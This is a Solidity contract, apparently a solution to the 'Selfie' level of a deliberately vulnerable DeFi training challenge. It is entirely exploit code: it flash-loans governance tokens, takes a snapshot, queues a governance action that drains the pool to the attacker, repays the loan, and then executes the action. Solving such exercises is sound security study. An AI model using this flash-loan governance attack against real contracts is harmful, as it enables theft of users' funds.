// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract AttackSelfie {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    address private owner;
    uint256 public actionId;

    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance) {
        owner = msg.sender;
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot(tokenAddress).snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner)
        );
        actionId = simpleGovernance.queueAction(msg.sender, data, 0);
        DamnValuableTokenSnapshot(tokenAddress).transfer(
            address(selfiePool),
            amount
        );
    }

    function loan(uint amt) public {
        selfiePool.flashLoan(amt);
    }

    function attack() public {
        simpleGovernance.executeAction(actionId);
    }
}
